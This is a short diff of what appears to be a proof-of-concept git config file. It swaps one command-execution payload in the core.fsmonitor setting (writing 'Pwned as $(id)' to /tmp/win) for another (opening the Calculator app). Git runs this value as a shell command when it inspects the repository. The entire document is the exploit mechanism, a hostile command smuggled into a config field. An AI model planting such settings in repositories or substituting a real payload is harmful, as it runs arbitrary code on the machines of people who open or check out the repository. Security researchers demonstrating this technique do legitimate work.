@@ -3,4 +3,4 @@
 	filemode = true
 	bare = false
 	worktree = "worktree"
-	fsmonitor = "echo \"Pwned as $(id)\">/tmp/win;false"
+	fsmonitor = "open /System/Applications/Calculator.app;echo"
